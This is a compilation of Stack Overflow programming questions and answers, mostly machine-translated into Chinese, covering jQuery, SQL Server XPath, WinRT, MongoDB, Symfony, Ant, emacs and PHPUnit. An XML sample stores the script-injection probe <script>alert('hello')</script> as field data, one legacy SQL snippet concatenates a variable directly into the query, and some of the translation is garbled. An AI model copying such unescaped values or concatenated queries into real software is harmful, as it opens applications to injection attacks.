    // GET TARGET LOCATION AND ANIMATE
    scrollTopPage: function () {

        $(htmlBody).animate({
            scrollTop: 0
        }, 'slow');

    },

    scrollToSect: function (htmlBody) {

        $(htmlBody).animate({

            scrollTop: $('#page-id').offset().top
        });

    },

    goToID: function (sectID) {

        var htmlBody = 'html,body';

        //Scroll to the very top
        if (sectID == 'home') {

            methods.scrollTopPage(htmlBody);

        } else {

            methods.scrollToSect(htmlBody);

        }

    }

} // End the Methods/Functions

    this.click(function (e) {

        sectID = $(this).attr('id');

            e.preventDefault();

            // Undefined Error
            methods.goToID(sectID); // Call the goToID function and pass the sectID variable

                $(this).parent().addClass('current').prev().removeClass('current');
                $(this).parent().addClass('current').next().removeClass('current');

    });

    $(document).keydown(function (e) {

        //To Do Re Use the methods/functions here

    });

};

})(jQuery); 
```

或者您也可以在创建插件时传递方法...

# xpath - SQL Server 中的动态 XPath 创建

> ID：14379547
> 
> 赞同：0
> 
> 时间：2013-01-17T12:50:45.393
> 
> 标签：xpath

我有一个 XML，我想动态获取 Xml 节点值。我想传递节点名称，并返回函数或 SP 应该返回该节点的值。

```
<ClassificationTypeEntity>

        <LTABLE_ID>3170</LTABLE_ID>

        <LTABLE_CODE>script Code</LTABLE_CODE>

        <LTABLE_DESC>alert(''hello'')</LTABLE_DESC>

        <ACTIVE_YES_NO>1</ACTIVE_YES_NO>enter code here

        <PRIVATE_FILING>0</PRIVATE_FILING>

        <RETENTION_CODE /><RETENTION_TITLE />

        <LTABLE_ID_P>0</LTABLE_ID_P>

</ClassificationTypeEntity>; 
```

例如，在上面的 xml 中，当我想要 LTABLE_CODE 节点的值时，我将传递相同的值，我应该得到的结果是

脚本代码

与 LTABLE_DESC 相同，结果应该是 alert(''hello'')

但是，我可以为两者编写 2 Xpath 查询，但如果我的架构发生更改（添加或删除更多属性），那么我也必须更改我的 SP。

谢谢，莫希特耆那教

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-01-18T14:18:56.360

感谢您的回复。

我找到了解决方案：

```
declare @xmlData xml, @NodeName VarChar(500), @nodeValue VarChar(500)

Set @NodeName = 'LTABLE_CODE';

--Set @NodeName = 'LTABLE_DESC';

set @xmlData = 

 '<ClassificationTypeEntity xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance">

   <LTABLE_ID>3170</LTABLE_ID>

   <LTABLE_CODE>&lt;script&gt;al</LTABLE_CODE>

   <LTABLE_DESC>&lt;script&gt;alert(''hello'')&lt;/script&gt;</LTABLE_DESC>

   <ACTIVE_YES_NO>1</ACTIVE_YES_NO>

   <PRIVATE_FILING>0</PRIVATE_FILING>

   <RETENTION_CODE /><RETENTION_TITLE />

   <LTABLE_ID_P>0</LTABLE_ID_P>

</ClassificationTypeEntity>'

SET @nodeValue = @xmlData.value('(/ClassificationTypeEntity/*[local-name()=sql:variable("@NodeName")])[1]','nvarchar(max)')

SELECT @nodeValue 
```

# multithreading - C# WinRT 组件在从 WinJS 调用的 UserControl 构造函数中失败

> ID：14379549
> 
> 赞同：5
> 
> 时间：2013-01-17T12:51:08.310
> 
> 标签：multithreading, user-interface, windows-runtime, winrt-xaml, winjs

我们正在使用 JavaScript (WinJS) 构建一个 WinRT 应用程序，该应用程序通过 C# WinRT 组件库访问 REST/JSON Web 服务。在组件库中，我们有一个登录控件（很像 WebAuthenticationBroker），它允许我们将 ACS 登录与我们的 REST 服务一起使用。

应用层：

*   客户端（JS）
*   WinRT 组件 dll (C#)
*   C# 类库 dll (C#)
*   UserControl（Xaml/C#，包含 WebView）

问题：当尝试创建登录控件时，WinRT 会抛出“HRESULT: 0x8001010E (RPC_E_WRONG_THREAD)”异常（进入 UserControl 的构造函数时）***，即使我通过 Windows.UI.Core.CoreWindow.GetForCurrentThread().Dispatcher 调用它***（在[我发现的有关 WinJS/C++ 组件](http://msdn.microsoft.com/en-us/library/windows/apps/hh755833%28v=vs.110%29.aspx)的 MSDN 文章中推荐）。

如果我从 Xaml/C# 客户端调用它，无论是否使用 Windows.UI.Core.CoreWindow.GetForCurrentThread().Dispatcher.RunAsync()，代码都可以工作。

我试过用谷歌搜索这个并且还阅读了所有的 UserControl、Dispatcher 和 WinJS 文档，但我没有找到任何相关的东西。这是一个已知问题吗？有人可以提出解决方法吗？

由于我是第一次发帖，请保持温和 :-) 非常欢迎任何帮助！

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2013-01-17T18:32:50.220

[基于 Xaml 的 WinRT 控件不能在基于 Javascript 的 WinRT 项目中使用。](https://stackoverflow.com/a/12713334/501196)您可以使用任何 WinRT 类库，但不能使用其中的 Xaml 控件。

If you still want to combine HTML-Javascript with Xaml, I would recommend creating a Xaml-based project, and wrapping your HTML UI in a [WebView control](http://msdn.microsoft.com/library/windows/apps/windows.ui.xaml.controls.webview.aspx).

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2013-01-17T17:07:45.007

我不希望在 HTML/WinJS 应用程序中使用 WinRT/XAML UI。您可能需要使用一些回调来请求在 WinJS 应用程序/组件库而不是 XAML 库中创建 UI。

# c# - 根据下拉列表中的值自动完成显示数据

> ID：14379550
> 
> 赞同：0
> 
> 时间：2013-01-17T12:51:15.723
> 
> 标签：c#, jquery, autocomplete

有谁知道如何根据下拉列表中所选项目的值过滤文本框中返回的数据，或者有任何链接。

即，如果用户从列表中选择酒店，那么当他们开始在文本框中输入时，只有与酒店类别匹配的公司的地址才会使用自动完成功能出现。

* * *

我在下面添加了服务器端代码，但出现以下错误。

```
public JsonResult FilterDirectorySearch(string searchText, string context)
        {
        var wq = DirectoryList(searchText,context).Select(a =>
           new { Location = a.strLocationSearch });
        return Json(wq.Distinct(), JsonRequestBehavior.AllowGet);
        }

    private List<DisplayDirectoryDataForSearchBox> DirectoryList(string searchString, string context)
        {
        var wq = _IGTDD.DisplayDirectoryData()
                  .Where(a => a.strLocationSearch.Contains(searchString, StringComparison.OrdinalIgnoreCase) && a.strCategory = context).ToList();
        return wq.ToList();
        } 
```

错误 错误 1 ​​实例参数：无法从“字符串”转换为“System.Linq.IQueryable”

错误 2 'string' 不包含 'Contains' 的定义，并且最佳扩展方法重载 'System.Linq.Queryable.Contains(System.Linq.IQueryable, TSource, System.Collections.Generic.IEqualityComparer)' 有一些无效参数

错误 3 参数 3：无法从 'System.StringComparison' 转换为 'System.Collections.Generic.IEqualityComparer'

忘记为下面的代码添加此错误

```
return (from x in wq where x.strLocationSearch.StartsWith(searchString, StringComparison.OrdinalIgnoreCase) && x.strCategory = context select x.strLocationSearch).AsEnumerable(); 
```

错误消息：错误 1 ​​运算符“&&”不能应用于“布尔”和“字符串”类型的操作数

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-01-17T12:58:38.380

任何自动完成 javascript 工具通常都允许您将源配置为函数，可以是 javascript 函数和本地数据，也可以是 AJAX 服务器源的函数。

在本地 javascript 函数或删除 AJAX 响应程序中，您可以通过从所需的下拉框中拉取值来简单地添加额外的上下文数据。

然后处理将在本地 javascript 代码中或在远程 AJAX 响应程序中处理额外信息。

如果没有您使用的自动完成编码的任何上下文，很难用代码说明我的答案。

但是，如果您使用 jQuery、自动完成 UI 和 AJAX 函数作为源代码：

```
$("#autocompleteTextBox").autocomplete({
    source: function(request, response) {
        var autocompleteContext = $("#dropdownBox").val();
        $.ajax({
            url: "http://source.com/searchJSON",
            dataType: "jsonp",
            data: {
                query: request.term,
                context: autocompleteContext
            },
            success: function(data) {
                ... 
```

注意这两行：

1.  设置 autocompleteContext 变量的位置，大概来自您所说的 Dropbox
2.  其中 autocompleteContext 被馈送到 data 参数中的 searchJSON 操作

在服务器端（searcjJSON 的处理程序）[C#/MVC 伪代码]：

```
public List<string> searchJSON(string query, string context)
{
   return (from x in db.SearchTable where x.Name.Contains(query) && x.context == context select x.Name).ToList()
} 
```

如果您只是在 javascript 中使用本地数组源，请更改为函数源，类似于 AJAX 源...

```
var fullArray = ["Apple", "Bat", "Cat", "Dog"];
$("#autocompleteTextBox").autocomplete({
    source: function(request, response) {
        var autocompleteContext = $("#dropdownBox").val();
        response = //Code to filter fullArray with request.term and autocompleteContext here
    } 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-01-17T13:45:16.443

这是功能齐全的仅客户端示例：

```
<html xmlns="http://www.w3.org/1999/xhtml">
<head runat="server">
    <title></title>
    <script src="http://code.jquery.com/jquery-1.8.3.js" type="text/javascript"></script>
    <script src="http://code.jquery.com/ui/1.9.2/jquery-ui.js" type="text/javascript"></script>
    <link rel="stylesheet" href="http://jqueryui.com/resources/demos/style.css" />
    <script type="text/javascript">
        if (!Array.prototype.filter) {
            Array.prototype.filter = function (fun /*, thisp */) {
                "use strict";

                if (this == null)
                    throw new TypeError();

                var t = Object(this);
                var len = t.length >>> 0;
                if (typeof fun != "function")
                    throw new TypeError();

                var res = [];
                var thisp = arguments[1];
                for (var i = 0; i < len; i++) {
                    if (i in t) {
                        var val = t[i]; // in case fun mutates this
                        if (fun.call(thisp, val, i, t))
                            res.push(val);
                    }
                }

                return res;
            };
        }

        $(function () {
            var availableAddresses = [
                "New York Hotel",
                "London Restaurant",
                "London Hotel",
                "Paris Restaurant",
                "Berlin Restaurant",
                "Moscow Restaurant"
            ];
            $("#businesses").keyup(function () {
                $("#businesses").autocomplete({
                    source: availableAddresses.filter(function (element, index, array) {
                        return (element.toLowerCase()
                            .indexOf($("#filter").val().toLowerCase()) !== -1);
                    })
                });

            });
        });
    </script>
</head>
<body>
    <form id="form1" runat="server">
        <div>
            <select id="filter">
                <option>hotel</option>
                <option>restaurant</option>
            </select>
            <input type="text" id="businesses"/>
        </div>
    </form>
</body>
</html> 
```

# c# - 如何在 ObservableCollection 的项目被替换时得到通知

> ID：14379551
> 
> 赞同：2
> 
> 时间：2013-01-17T12:51:17.280
> 
> 标签：c#, wpf, observablecollection

我想向一个可观察的集合添加一个事件处理程序，每次在其中添加、删除或更新项目时都会触发该事件处理程序。

CollectionChanged 事件在添加或删除项目时引发，但在替换项目时不引发，例如用类似这样的东西

```
obsList[5] = MyUpdatedCustomObject; 
```

有什么建议么？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-01-17T13:01:35.867

我想，你不能这样做，索引器：

```
public T this[int index] { get; set; } 
```

是从类继承的`Collection<T>`，这个索引器不是虚拟的来改变它的行为！

但实际上，当我在一个非常小的应用程序上进行测试时，该事件会在您的情况下触发，您有问题，请提供一些额外的代码！

* * *

## 回答 #2

> 赞同：-3
> 
> 时间：2013-01-17T12:56:29.277

```
private ObsersvableCollection<Type> _MyCollection = new ObservableCollection<Type>();

_MyCollection.CollectionChanged += new NotifyCollectionChangedEventHandler(_MyCollection_CollectionChanged);

protected void _MyCollection_CollectionChanged(object sender, NotifyCollectionChangedEventArgs e)
{
    switch(e.Action)
    {
        case NotifyCollectionChangedAction.Add:
            //use e.NewItems to get items added.     
        break;
        case NotifyCollectionChangedAction.Remove:
            //use e.OldItems to get items removed.
        break;

    }
} 
```

# javascript - 按钮点击不重复？

> ID：14379559
> 
> 赞同：-6
> 
> 时间：2013-01-17T12:51:44.787
> 
> 标签：javascript

我已经在我的计算器上创建了 css html。我在为点按钮编写 js 代码时遇到问题。单击按钮一次后，我不想再写了。我应该怎么办？函数怎么写？这是示例代码：

```
<html>

<head>

<title></title>
<script language="javascript">

function nok(){  

    value = document.getElementById("rakamkutusu").value + '.';

    document.getElementById("rakamkutusu").value = value;

}

</script>
</head>

<body>
<tr>
    <input type='Text' class="deneme" id="rakamkutusu" name="rakam" size="70" value='0'></th>
</tr>
<tr>
   <th><input name="btnNOKTA" type="Button" class="butonlar"id="nokta" value=" . " onclick="nok()"></th>
</tr>
</body>

</html> 
```

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-01-17T12:54:09.473

这听起来像是一个家庭作业评估，所以我会给你一个提示：

您想要的是向`event listener`元素添加一个。

您可以为每个按钮编写一个特定的侦听器，或者只编写一个根据触发它的按钮确定要做什么的侦听器。

更新 ：

你的函数是一个很好的起点。您可以向它添加一个参数，以确定哪个按钮用于调用它。

像这样：

```
function HandleItemClicked(sender)
{
   //now do something with sender
} 
```

为了获取在发件人中被点击的元素，您可以执行以下操作：

```
<div id="someElement1" onclick="HandleItemClicked(this)">1</div>
<div id="someElement2" onclick="HandleItemClicked(this)">2</div> 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-01-17T13:52:00.710

```
<script type="text/javascript">

function nok(){  
    value = document.getElementById("rakamkutusu").value + '.';
    document.getElementById("rakamkutusu").value = value;
}
</script> 
```

[演示](http://jsfiddle.net/MuhammadHani/646GK/)

# mongodb - 将大型 mongo 数据库的一部分复制到另一台服务器的最快/最佳方法？

> ID：14379560
> 
> 赞同：1
> 
> 时间：2013-01-17T12:51:46.247
> 
> 标签：mongodb

我有一个存储在 Mongo 中的 1 亿条推文数据集，未优化且未编入索引。

我需要将上个月的所有推文复制到另一台服务器上，最好的方法是什么？

我的想法是使用 Ruby 脚本提取相关推文并将其复制到服务器上的新数据库中，然后运行 ​​mongo copyDatabase 命令将其复制过来。不过它的时间很长，还有其他方法吗？

```
require 'mongo_mapper'
MongoMapper.database = 'twitter'
require './models'
tweets = TwitterTweet.where(:created_at => {"$gt" => 1.month.ago}).all; # about 15 million

MongoMapper.database = 'monthly'
# copy the tweets over to the new db
tweets.each do |tweet|
  tweet.save!
end; 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-01-17T13:23:50.923

如果您需要多台服务器上的数据，您应该使用 mongodb 复制功能。如果您只想备份数据，那么最快的方法就是复制 db 文件。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-01-17T13:31:23.543

一些想法：

*   添加多个客户端/线程来进行处理/保存（例如，为了简单起见，也许每个人都在一天的推文上工作）。继续添加客户端，直到服务器满负荷。
*   将整个数据库复制到新服务器并删除旧数据，然后对其进行[压缩](http://docs.mongodb.org/manual/reference/command/compact/)（并对其进行索引）。
*   考虑禁用日志（如果这对您的需要是安全的），或者调整它以减少写入[频率](http://docs.mongodb.org/manual/reference/mongod/#cmdoption-mongod--journalCommitInterval)（降低持久性）
*   确保禁用任何日志记录、跟踪等
*   确保服务器的大小足以处理负载
*   或者，在它完成时休一个长假。:)

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2013-01-21T15:24:55.013

只需将数据库文件复制到新主机，启动 mongod 并删除不需要的文档/删除数据库/集合。这是最快的方法。

# symfony - 翻译 symfony2 路由错误

> ID：14379561
> 
> 赞同：0
> 
> 时间：2013-01-17T12:51:47.370
> 
> 标签：symfony, internationalization, routing

如果访问 a 的错误`/login`是：

> 找不到“GET /login”的路线

当我尝试访问时`/en/login`将我重定向到登录，但我得到了同样的错误。

在我的 routing.yml 我有：

```
login:
    pattern:   /{_locale}/login
    defaults:  { _controller: miomioBundle:Security:login}
    requirements:
        _locale: es|en|de
    options:
      expose: true 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-01-17T16:24:32.103

这听起来像你有两个不同的问题。

1.  路由 /login 不存在。您已经在 /es/login、/en/login 和 /de/login 上方设置了三个路由，但没有单独设置 /login。

2.  您必须设置一些访问控制设置，不允许未经身份验证的用户访问上述三个路由，因此您将被重定向到 /login 以进行身份​​验证...但如第 1 点所述，该路由不存在。

要解决第 1 点，您实际上需要设置一个处理登录表单的路由。有关分步方法，请参阅 Symfony 文档：http: [//symfony.com/doc/current/book/security.html#using-a-traditional-login-form](http://symfony.com/doc/current/book/security.html#using-a-traditional-login-form)

对于第 2 点，您需要在 security.yml 文件中设置一些访问控制，以允许用户无需登录即可访问您的登录页面：

```
access_control:
  - { path: ^/es/login, roles: IS_AUTHENTICATED_ANONYMOUSLY }
  - { path: ^/en/login, roles: IS_AUTHENTICATED_ANONYMOUSLY }
  - { path: ^/de/login, roles: IS_AUTHENTICATED_ANONYMOUSLY } 
```

您必须已经具有如下所示的访问控制，否则您的登录页面将在无限循环中崩溃：

```
access_control:
      - { path: ^/login, roles: IS_AUTHENTICATED_ANONYMOUSLY } 
```

不过我不得不说，如果它只是一个简单的登录表单，那么坚持使用 1 个登录表单并使用翻译处理标签和登录文本会更好。[http://symfony.com/doc/master/book/translation.html](http://symfony.com/doc/master/book/translation.html)

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-01-17T19:17:55.550

查看[JMSTranslation Bundle](http://jmsyst.com/bundles/JMSTranslationBundle)以及您可能更感兴趣的[JMSI18nRoutingBundle](http://jmsyst.com/bundles/JMSI18nRoutingBundle)。JMSI18nRoutingBundle 允许您指定路由在 config.yml 文件中的工作方式。

如果您希望您的 URL 使用默认区域设置为 /login，您将设置如下内容：

```
jms_i18n_routing:
  default_locale: en
  locales: [de, en]
  strategy: prefix_except_default 
```

但是，如果您希望您的网址始终包含语言环境，例如：en/login 或 de/login，您需要将策略参数更改为“前缀”

```
jms_i18n_routing:
  default_locale: en
  locales: [en, de]
  strategy: prefix 
```

# java - 构建包含另一个项目的 ANT 项目

> ID：14379564
> 
> 赞同：1
> 
> 时间：2013-01-17T12:51:58.127
> 
> 标签：java, ant, build

我有 2 个项目：

1.  项目1 - 独立
2.  Project2 - 在“构建路径”下的“项目”选项卡中包含 Project1 (Eclipse Junu)

**我的 Ant build.xml (project2) 看起来像这样：**

```
<?xml version="1.0" encoding="UTF-8"?>
<project basedir="." default="all" name="Project2">
<property name="projectName" value="Project2"/>
<property environment="env"/>
<property name="runnerRoot" value="${env.RUNNER_ROOT}"/>
<property name="dist" value="../FluidFsAuto/lib"/>
<property name="buildFilesDir" value="${runnerRoot}/dev"/>
<import file="${buildFilesDir}/buildHelper.xml"/>
</project> 
```

我收到未定义的错误，例如：“找不到符号”......等等......

如何，我可以使用 ANT build 用 build.xml 编译 project2 吗？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-01-17T12:55:45.307

使用[Ant](http://ant.apache.org/manual/Tasks/ant.html)任务从其他构建文件运行任务。

但此时您应该考虑使用[Apache Maven](http://maven.apache.org/)。

- - 编辑 - -

下面是一些如何依次调用多个 build.xml 文件的示例：

```
<target name="myTask1">
    <!-- simple call to the build.xml -->
    <ant antfile="../project2/build.xml" target="myTask2"/>

    <!-- to pass a property to the target build.xml, use this -->
    <ant antfile="../project3/build.xml" target="myTask3">
        <property name="myProperty1" value="myValue1"/>
    </ant>

    <!-- to pass all properties to the target build.xml, use inheritAll -->
    <property name="myProperty2" value="myValue2"/>
    <ant antfile="../project4/build.xml" target="myTask4" inheritAll="true"/>
</target> 
```

更多例子[在这里](http://ant.apache.org/manual/Tasks/ant.html)。

# linux - 在 mac 上使用 XQuartz 打开安装在远程服务器上的 emacs 时将 Meta 更改为选项键

> ID：14379566
> 
> 赞同：9
> 
> 时间：2013-01-17T12:52:07.357
> 
> 标签：linux, macos, emacs, x11

我的问题是这样的：首先，我使用 Mac 上的 Terminal.app 通过 ssh -Y 登录到远程服务器。然后通过键入打开安装在该远程服务器上的 emacs

```
emacs 
```

因为我在使用 ssh 时添加了选项 -Y，所以在 Mac 上安装的 XQuartz 中打开了 emacs。

这时候问题来了：option键没有被当作Meta，只有ESC键被当作Meta。但我想将选项键用作 Meta。

我该如何解决？

* * *

## 回答 #1

> 赞同：8
> 
> 时间：2013-01-17T12:58:57.843

看看[http://www.emacswiki.org/emacs/MetaKeyProblems](http://www.emacswiki.org/emacs/MetaKeyProblems)

特别是这部分。

然后，您可以使用 option/alt 键作为元键从 X11 窗口（Applications/Utilities/X11.app）运行 emacs。此外，您可以使用 xmodmap 命令将命令键重新映射到仅在 X11 下的 Control。这样做的好处是允许命令键与其他 Mac 应用程序配合使用。xmodmap 还可以确保将 Alt/Option 键设置为 emacs 中的 Meta 键。您可以使用以下 ~/.xmodmap 文件执行此操作（以感叹号开头的行是注释，可以省略）：

```
! undo any meta keys already set
 clear Mod1
 ! keycodes 63 and 71 are the left and right COMMAND buttons adjacent to the spacebar; set them to be control keys
 keycode 63=Control_L
 keycode 71=Control_R
 ! keycodes 66 and 69 are the option/alt keys; assign them as Meta keys
 keycode 66=Meta_L
 keycode 69=Meta_R
 ! now tell X11 that the Meta keys act as the Mod1 (meta) modier key; that is, when they are pressed with KEY, it is the same as hitting M-KEY
 add Mod1 = Meta_L Meta_R
 ! tell X11 that the Control keys are Control modifiers, so when pressed with u (for example) it is the same as hitting C-u
 add Control = Control_L Control_R 
```

将上述文件与命令一起使用

```
xmodmap ~/.xmodmap 
```

在启动 emacs 之前（例如，如果您使用 xterm 的登录 shell 选项，则从 /etc/bashrc 开始，即 X11/Application/Customize 中的 xterm -ls 用于终端）。

# symfony1 - 强制从 PHPUnit 代码覆盖中排除文件

> ID：14379569
> 
> 赞同：20
> 
> 时间：2013-01-17T12:52:10.730
> 
> 标签：symfony1, phpunit, symfony-1.4, code-coverage

是否可以从 PHPUnit 的代码覆盖范围中强制排除文件夹？

我遇到的问题是，我有一个 Symfony 1.4 项目，它的文件夹位于`./lib/vendor/symfony/*`. 我想排除内部的任何东西`./lib/vendor/*`- 递归。

现在，我想排除它们，无论它们是否被我的测试隐式覆盖，即我不想看到这些文件夹。因此，我已将此位添加到我的`phpunit.xml`配置文件中，但无论我做什么，它似乎都没有排除这些文件夹：

```
<filter>
    <whitelist>
        <exclude>
            <directory>./lib/vendor/*</directory>
            <directory>./lib/vendor/symfony/lib/*</directory>
        </exclude>
    </whitelist>
</filter> 
```

在我看来，当代码被击中并且 XDebug 注意到它时，PHPUnit 无论如何都会将它包含在代码覆盖率中。这样做的缺点是，这个代码已经被 Symfony 开发人员测试过了，所以不需要把它包含在我的覆盖率报告中，弄乱我的数字：P

* * *

## 回答 #1

> 赞同：27
> 
> 时间：2013-01-17T13:51:10.537

好的，所以我认为您可以拥有黑名单部分或白名单部分，结果您可以同时拥有两者，所以我将这些文件夹列入黑名单并且它有效：

```
 <filter>
        <blacklist>
              <directory>./lib/vendor</directory>
              <directory>./lib/helper</directory>
        </blacklist>
    </filter> 
```

* * *

## 回答 #2

> 赞同：23
> 
> 时间：2018-08-27T09:38:11.820

在 PHPUnit 或多或少的最新版本中，从覆盖率报告中排除某些文件的正确方法是使用`<exclude>`指令而不是`<blacklist>`. 例如：

```
 <filter>
    <whitelist>
      <directory suffix=".php">src/</directory>
        <exclude>
           <directory suffix=".php">src/Legacy/</directory>
           <file>src/example.php</file>
        </exclude>
    </whitelist>
  </filter> 
```

对于使用最新模式的最新 PHPUnit，这将是：

```
 <coverage>
    <include>
      <directory suffix=".php">src/</directory>
    </include>
    <exclude>
      <directory suffix=".php">src/Legacy/</directory>
      <file>src/example.php</file>
    </exclude>
  </coverage> 
```

* * *

## 回答 #3

> 赞同：2
> 
> 时间：2015-06-20T09:04:36.210

观察：与黑名单相比，白名单（您希望包含在代码覆盖范围内的目录）使整个测试套件的 phpunit 执行更快。

```
<filter>
    <whitelist>
          <directory>/my/project/directory/to/be/covered</directory>
          ....
    </whitelist>
</filter> 
```

测试：PHPUnit 4.5.0 和 PHP 5.5.9

* * *

## 回答 #4

> 赞同：1
> 
> 时间：2018-02-27T03:07:46.567

这些答案似乎都适用于旧版本`PHPUnit`

我正在运行`PHPUnit 5.7.23`并且在获取包含和排除`phpunit`. [语法](https://phpunit.de/manual/current/en/appendixes.configuration.html#appendixes.configuration.whitelisting-files)似乎发生了很大变化，只是部分向后兼容。我有一个复杂的要求，我还需要包含和排除用于代码覆盖的单独目录（它是一个遗留系统）。

这是我需要的`phpunit.xml`：

```
<testsuites>
    <testsuite name="Unit Tests">
        <directory suffix="Test.php">./tests</directory>

        <exclude>./tests/blah/excluded_file_from_tests1.php</exclude>
        <exclude>./tests/blah/excluded_file_from_tests2.php</exclude>
        <exclude>./tests/blah/excluded_file_from_tests3.php</exclude>
    </testsuite>
</testsuites>
<filter>
    <whitelist processUncoveredFilesFromWhitelist="true">
        <directory suffix=".php">./common/lib/included_directory</directory>
        <exclude>
            <directory suffix=".php">./common/lib/included_directory/core/blah/excluded_directory</directory>
        </exclude>
    </whitelist>
</filter> 
```

所以：

*   在`<testsuites>`我包括`./tests`目录下
*   但是，在`.tests`我想排除一组文件`excluded_file_from_testsX.php`
*   然后，我想将目录列入白名单`./common/lib/included_directory`
*   但是，在几个级别以下的包含目录下是一个我也想排除的目录（./common/lib/included_directory/core/blah/excluded_directory）。

所以这在运行时似乎运作良好`phpunit --coverage-html build/coverage`

* * *

## 回答 #5

> 赞同：0
> 
> 时间：2020-08-12T22:32:01.230

适用于 PHPUnit 9.0.1

```
<filter>
    <whitelist addUncoveredFilesFromWhitelist="true">
        <directory suffix=".php">DIRECTORY_TO_ADD</directory>
        <directory suffix=".php">ANOTHER_DIR_TO_ADD</directory>
        <exclude>
            <file>ANOTHER_DIR_TO_ADD/file1_to_not_include.php</file>
            <file>ANOTHER_DIR_TO_ADD/file2_to_not_include.php</file>
        </exclude>
    </whitelist>
</filter> 
```

# sql - 函数参数列表中的错误：“=”无法识别。无法解析查询文本

> ID：14379573
> 
> 赞同：2
> 
> 时间：2013-01-17T12:52:24.930
> 
> 标签：sql, visual-studio-2008, odbc

我在 Visual Studio 2008 的查询窗格中生成了一个我似乎无法弄清楚的错误。

> 函数参数列表中的错误：“=”无法识别。无法解析查询文本。

在对语法进行一些清理并添加一些适当的引号后，问题仍然存在。无论如何，我都尝试执行查询，最终在 Visual Studio 2008 中无休止地等待。

这是查询。

```
 SELECT 
 leg.tsrido, 
 leg.tsrnum, 
 shipment.dosvlg, 
 condition(leg.tsakti = 1, load.land, unload.land), 
 condition(leg.tsakti = 1, load.postun, unload.postun), 
 condition(leg.tsakti = 1, load.tsadr1, unload.tsadr1) 

 FROM 
 tsroma leg 
 LEFT OUTER JOIN (SELECT * FROM tsdsmd WHERE (srtdos = 'd')) shipment 
 ON leg.dosvlg = shipment.dosvlg 

 LEFT OUTER JOIN (SELECT * FROM tsdnaw WHERE (tsroln = 1)) load 
 ON leg.dosvlg = load.dosvlg 

 LEFT OUTER JOIN (SELECT * FROM tsdnaw WHERE (tsroln = 3)) unload 
 ON leg.dosvlg = unload.dosvlg 

 WHERE (leg.tsrido = 79106279)

 ORDER BY 2 
```

我正在使用 ODBC，连接字符串包括 Driver={UNIMS}。这是一个非常古老的数据库，我必须在我的应用程序中支持它。

某处的语法可能有问题，但我看不到。

**Edit1：** 这是一个在 UNIMS 数据库上“工作”的示例条件代码。（从旧应用程序中的 AnsiString 中取出。）

```
condition(leg.tstohn = '" + pAuthorization[7] + "', shipment.pllaad, shipment.pllos)
condition(leg.tstohn = '" + pAuthorization[7] + "', shipment.tslzcd, shipment.tsuzcd)
condition(leg.tstohn = '" + pAuthorization[7] + "', shipment.lalaad, shipment.lalos)         
condition(leg.tstohn = '" + pAuthorization[7] + "', shipment.nmlaad, shipment.nmlos) zkafz
condition(leg.tstohn = '" + pAuthorization[7] + "', shipment.adrlaa, shipment.adrlos) 
```

**编辑2：**

也找不到关于 UNIMS SQL UNIMS SQL 的很多文档。这里有更多可能有帮助的信息。

*   司机={UNIMS}；
*   用于 ODBC 的 .NET Framework 数据提供程序
*   UNIMS SQL
*   州公开赛
*   版本 02.05.0028

**Edit3：** 这是整个 C# 代码

```
public string qShipments(string a)
{
    string q = "";
    #region Oracle
    if (env == "Oracle")
    {
        /* string Oracle_Shipment
         * Alias issue: http://stackoverflow.com/questions/14218695/ora-00972-identifier-is-too-long
                        SELECT DISTINCT
                        csl."tripNumber",
                        csl."shipmentNumber",
                        csl."legType",
                        csl."planSequence",
                        csl."toHubSearchname",
                        CASE WHEN csl."legType" = 1 THEN Address1."countryCode" ELSE Address3."countryCode" END countryCode,
                        CASE WHEN csl."legType" = 1 THEN Address1."postcode" ELSE Address3."postcode" END postcode,
                        CASE WHEN csl."legType" = 1 THEN Address1."streetLine1" ELSE  Address3."streetLine1" END streetLine

                        FROM 
                        "cef_v_cw_trip" ct 
                        LEFT OUTER JOIN "cef_v_cw_shipmentLegs" csl 
                        ON ct."tripNumber" = csl."tripNumber"

                        LEFT OUTER JOIN "cef_v_cw_shipment" cs 
                        ON csl."shipmentNumber" = cs."shipmentNumber"

                        LEFT OUTER JOIN (SELECT * FROM "cef_v_cw_fileAddress" WHERE "addressRole" = 1) Address1
                        ON cs."shipmentNumber" = Address1."fileNumber"

                        LEFT OUTER JOIN (SELECT * FROM "cef_v_cw_fileAddress" WHERE "addressRole" = 3) Address3
                        ON cs."shipmentNumber" = Address3."fileNumber"

                        WHERE ct."tripNumber" = '1045013'
                        AND csl."toHubSearchname" <> ' '
                        ORDER BY 4
         */
        q = string.Format("SELECT DISTINCT " +
                             "csl.\"tripNumber\", " +
                             "csl.\"shipmentNumber\", " +
                             "csl.\"legType\", " +
                             "csl.\"planSequence\", " +
                             "csl.\"toHubSearchname\", " +
                             "CASE WHEN csl.\"legType\" = 1 THEN Address1.\"countryCode\" ELSE Address3.\"countryCode\" END countryCode, " +
                             "CASE WHEN csl.\"legType\" = 1 THEN Address1.\"postcode\" ELSE Address3.\"postcode\" END postcode, " +
                             "CASE WHEN csl.\"legType\" = 1 THEN Address1.\"streetLine1\" ELSE  Address3.\"streetLine1\" END streetLine " +
                             "FROM " +
                             "\"{0}v_cw_trip\" ct " +
                             "LEFT OUTER JOIN \"{0}v_cw_shipmentLegs\" csl " +
                             "ON ct.\"tripNumber\" = csl.\"tripNumber\" " +
                             "LEFT OUTER JOIN \"{0}v_cw_shipment\" cs " +
                             "ON csl.\"shipmentNumber\" = cs.\"shipmentNumber\" " +
                             "LEFT OUTER JOIN (SELECT * FROM \"{0}v_cw_fileAddress\" WHERE \"addressRole\" = 1) Address1 " +
                             "ON cs.\"shipmentNumber\" = Address1.\"fileNumber\" " +
                             "LEFT OUTER JOIN (SELECT * FROM \"{0}v_cw_fileAddress\" WHERE \"addressRole\" = 3) Address3 " +
